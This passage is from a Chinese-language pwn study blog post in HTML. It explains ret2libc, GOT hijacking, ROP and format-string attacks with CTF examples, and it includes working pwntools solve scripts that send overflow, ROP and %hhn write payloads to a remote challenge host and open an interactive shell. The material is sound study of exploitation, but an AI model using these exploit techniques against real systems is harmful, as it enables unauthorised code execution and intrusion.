+<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><h4 id="Lazy-Binding-機制"><a href="#Lazy-Binding-機制" class="headerlink" title="Lazy Binding 機制"></a>Lazy Binding 機制</h4><p>在程式碼需要執行某個函數時，透過呼叫他的plt去got表中尋找他在libary中的真正位置，如果沒有的話就會去library把該函數抓出來並放入got表以便下次查詢  </p>
+<h4 id="Libc-Base"><a href="#Libc-Base" class="headerlink" title="Libc Base"></a>Libc Base</h4><p>利用libc進行舉例：<br>因為ASLR的系統設定，每次got value都會加上一個隨機的libc base，導致每次執行的時候got value都不一樣。<br>如果可以得到某函數的got位址，就可以算出libc並加上任意函數的在libc的位址<br>libc base&#x3D;函數的got value-函數在libc中的位址  </p>
+<h4 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h4><p>Overflow到一個函數return的地方，並且注入某個位址，最後讓他return 去libc上面的某些好用函數(像是system，execve)。<br>必須得到某個函數的got value以及對方的libc，才能反推回去你要的特定函數got value並注入  </p>
+<h3 id="範例-4"><a href="#範例-4" class="headerlink" title="範例"></a>範例</h3><ul>
+<li>題目大意：(有提供執行環境libc)會要你給定一個hex值並查詢他的got value，並讓你再次輸入一個字串</li>
+<li>解法：利用radare2逆出puts函數的got表位址，輸入該位址後取得puts的got value，進而推出libc base。</li>
+<li>利用one_gadget加上提供的libc檔案取得<code>execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</code>函數在libc的位址，最後經由got value算法加回去並利用 BOF ret注入即可<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2123</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">&#x27;0x601018&#x27;</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">dat=<span class="built_in">int</span>(s[<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">dat=dat</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(dat))</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>+p64(dat-<span class="number">0x000000000006f690</span>+<span class="number">0x45216</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+圖：<br><img src="https://hackmd.io/_uploads/B1NSjcHan.png"></li>
+</ul>
+<h2 id="GOT-Hijacking"><a href="#GOT-Hijacking" class="headerlink" title="GOT Hijacking"></a>GOT Hijacking</h2><h3 id="利用條件-4"><a href="#利用條件-4" class="headerlink" title="利用條件"></a>利用條件</h3><ul>
+<li>No PIE</li>
+<li>Partial&#x2F;No RELRO</li>
+</ul>
+<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>利用可以創造可以修改plt值的機會改成想要的函數之位址  </p>
+<h2 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h2><p>簡稱：ROP<br>戳一下-&gt;||ROP好好玩owob||  </p>
+<h3 id="利用條件-5"><a href="#利用條件-5" class="headerlink" title="利用條件"></a>利用條件</h3><ul>
+<li>要有良好的ret gadget</li>
+<li>PIE被關閉</li>
+<li>沒有Stack Canary</li>
+<li>採用get讀取char陣列，導致Overflow成立</li>
+</ul>
+<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><h4 id="ROP-Gadget"><a href="#ROP-Gadget" class="headerlink" title="ROP Gadget"></a>ROP Gadget</h4><p>所謂ROP Gadget就是最後由ret結尾的程式碼片段<br>可以使用工具ROPgadget選擇適合的片段  </p>
+<h4 id="手法-1"><a href="#手法-1" class="headerlink" title="手法"></a>手法</h4><p>利用BOF串接Gadget到stack上面並讓它執行在函數return的地方，進行pop、ret等各種操作後搭配給定的ret2code變數(必須是全域或者有辦法找到他的位址，不然無法再別的函數裡戳它)，最後跑到某個片段做執行(通常是system函數)  </p>
+<h3 id="範例-5"><a href="#範例-5" class="headerlink" title="範例"></a>範例</h3><ul>
+<li>題目大意：會有兩次輸入字串的機會，第一次提問時會用system中的echo輸出，並且輸入的是個全域變數的字串，第二個則是get進去一個Buffer  </li>
+<li>解法：  </li>
+<li>0.看到system先radare2找出是跑去哪裡call system的<br><img src="https://hackmd.io/_uploads/rkKy8orp3.png">  </li>
+<li>1.利用ROPgadget抓ret結尾的東東<br><img src="https://hackmd.io/_uploads/SybrPsSTn.png">  </li>
+<li>2.找出全域變數的位址<br><img src="https://hackmd.io/_uploads/Hk2KDoSah.png"><br>事前準備結束~~  </li>
+<li>3.第一次輸入的時候payload為”&#x2F;bin&#x2F;sh\x00”(結尾\x00是為了做讀取到結尾的提示)  </li>
+<li>4.最後把剛剛的找到的ret gadget - 全域變數位址 - call system的路徑依序串起來，它就會用system執行剛剛變成payload的全域變數啦啦啦~~~~  </li>
+<li>solve script<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2120</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#global_variable defining</span></span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x0000000000400773</span>)+p64(<span class="number">0x601070</span>)+p64(<span class="number">0x4006bf</span>)</span><br><span class="line"><span class="comment">#buffer(0x30)+rdi(0x8)+ret2gadget(0x8)+gadgetValue(0x8)+gadget_to_system_function(0x8)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+圖：<br><img src="https://hackmd.io/_uploads/HyaIuir6n.png"><br>wwww其實ROP感覺還有很多東西還沒學到，之後有空練owob</li>
+</ul>
+<h2 id="Format-String-Attack"><a href="#Format-String-Attack" class="headerlink" title="Format String Attack"></a>Format String Attack</h2><h3 id="利用條件-6"><a href="#利用條件-6" class="headerlink" title="利用條件"></a>利用條件</h3><ul>
+<li>c 裡面的printf函數被使用</li>
+</ul>
+<h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>大概念：c語言裡面的printf如果單純輸出字串變數其實是可以被自訂格式的<br><code>%x</code>以hex的方式輸出內容，一直疊可以戳超出記憶體<br><code>%p</code>會輸出某個變數的value<br><code>%&#123;number&#125;$p</code>可以輸出stack上面指定number的變數value<br><code>%&#123;amount&#125;c%&#123;number&#125;$n</code>可以填入某個amount的字元到stack上面某個變數，並且因為後面接n所以可以變成8byte的value，但是這樣高機率會出事情，所以一般都使用1byte的hhn填下去  </p>
+<h3 id="範例1"><a href="#範例1" class="headerlink" title="範例1"></a>範例1</h3><ul>
+<li>題目大意：叫你輸入東西然後他會輸出醬</li>
+<li>解法：阿就用 %{number}$p 的方法一直亂戳下去就好，最後發現每個資料都被倒過來了就倒回去(喔喔還有會被hex編碼過)</li>
+<li>solve script<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">4001</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s);</span><br><span class="line">payload=<span class="string">&#x27;%6$p,%7$p,%8$p,%9$p,%10$p,%11$p,%12$p#&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;#&#x27;</span>)[<span class="number">9</span>:-<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">x</span>):</span><br><span class="line">    x=<span class="built_in">hex</span>(<span class="built_in">int</span>(x[<span class="number">2</span>:], <span class="number">16</span>))</span><br><span class="line">    x=binascii.unhexlify(x[<span class="number">2</span>:])</span><br><span class="line">    cnt=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        cnt += x[<span class="built_in">len</span>(x)-<span class="number">1</span>-i]</span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line">ans=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    ans+=enc(i)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
+圖：(不小心戳太多東西呵呵)<br><img src="https://hackmd.io/_uploads/By-PijSa2.png"></li>
+</ul>
+<h3 id="範例2"><a href="#範例2" class="headerlink" title="範例2"></a>範例2</h3><ul>
+<li>題目大意：叫你輸入東西，用printf輸出，然後比對某兩個int value如果吻合到就可以拿到&#x2F;bin&#x2F;sh  </li>
+<li>解法：利用radare2確認stack上面可以塞哪東西，慢慢算以後再用’a’去填充，最後再接上你的stack上面你剛剛要填入到第幾個的位置塞入你要改變的記憶體位址(好饒口，之後修)</li>
+<li>重點：要從低位往高位填寫，假設欲填寫的值為<code>v1</code>，前一位欲填寫值為<code>v0</code>，那須在這一位填寫<code>256-v0+v1</code>  </li>
+<li>註：利用<code>%&#123;amount&#125;c%&#123;number&#125;$hhn</code>類型的payload打</li>
+<li>solve script<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">4003</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">%??c%?$hhn%??c%?$hhn%??c%?$hhn%??c%?$hhn</span></span><br><span class="line"><span class="string">value</span></span><br><span class="line"><span class="string">value+1</span></span><br><span class="line"><span class="string">value+2</span></span><br><span class="line"><span class="string">value+3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ch=<span class="number">0</span></span><br><span class="line">addr=<span class="number">0x404050</span></span><br><span class="line">value=<span class="number">0xfaceb00c</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">idx=<span class="number">12</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    addch=((<span class="number">256</span>-ch)+(value&amp;<span class="number">0xff</span>))%<span class="number">256</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(addch, idx)</span><br><span class="line">    ch=value &amp; <span class="number">0xff</span></span><br><span class="line">    value &gt;&gt;= <span class="number">8</span></span><br><span class="line">    idx=idx+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(payload, <span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload+<span class="number">3</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload, <span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload+p64(addr)+p64(addr+<span class="number">1</span>)+p64(addr+<span class="number">2</span>)+p64(addr+<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(payload, <span class="built_in">len</span>(payload))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+圖：<br><img src="https://hackmd.io/_uploads/S1sh2sH6n.png"></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B0%A1%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">簡介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%80%E9%9C%80%E8%A6%81%E6%9C%83%E7%9A%84%E5%B7%A5%E5%85%B7-%E7%9F%A5%E8%AD%98"><span class="toc-number">3.</span> <span class="toc-text">所需要會的工具&amp;知識</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Program-Structure"><span class="toc-number">4.</span> <span class="toc-text">Program Structure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Pwntools"><span class="toc-number">5.</span> <span class="toc-text">Python Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E5%80%91"><span class="toc-number">5.1.</span> <span class="toc-text">指令們</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B"><span class="toc-number">5.2.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow"><span class="toc-number">6.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6"><span class="toc-number">6.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">6.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-1"><span class="toc-number">6.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2code"><span class="toc-number">7.</span> <span class="toc-text">BOF Ret2code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-1"><span class="toc-number">7.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">7.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-2"><span class="toc-number">7.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2ShellCode"><span class="toc-number">8.</span> <span class="toc-text">BOF Ret2ShellCode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-2"><span class="toc-number">8.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">8.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-3"><span class="toc-number">8.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2Lib"><span class="toc-number">9.</span> <span class="toc-text">BOF Ret2Lib</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-3"><span class="toc-number">9.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">9.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lazy-Binding-%E6%A9%9F%E5%88%B6"><span class="toc-number">9.2.1.</span> <span class="toc-text">Lazy Binding 機制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Libc-Base"><span class="toc-number">9.2.2.</span> <span class="toc-text">Libc Base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95"><span class="toc-number">9.2.3.</span> <span class="toc-text">手法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-4"><span class="toc-number">9.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GOT-Hijacking"><span class="toc-number">10.</span> <span class="toc-text">GOT Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-4"><span class="toc-number">10.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">10.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-Oriented-Programming"><span class="toc-number">11.</span> <span class="toc-text">Return Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-5"><span class="toc-number">11.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">11.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP-Gadget"><span class="toc-number">11.2.1.</span> <span class="toc-text">ROP Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95-1"><span class="toc-number">11.2.2.</span> <span class="toc-text">手法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-5"><span class="toc-number">11.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-Attack"><span class="toc-number">12.</span> <span class="toc-text">Format String Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-6"><span class="toc-number">12.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">12.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B1"><span class="toc-number">12.3.</span> <span class="toc-text">範例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B2"><span class="toc-number">12.4.</span> <span class="toc-text">範例2</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/10/12/pwn-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/10/12/pwn-note/&text=Pwn基礎筆記"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/10/12/pwn-note/&is_video=false&description=Pwn基礎筆記"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwn基礎筆記&body=Check out this article: http://wha13.github.io/2023/10/12/pwn-note/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/10/12/pwn-note/&name=Pwn基礎筆記&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/10/12/pwn-note/&t=Pwn基礎筆記"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
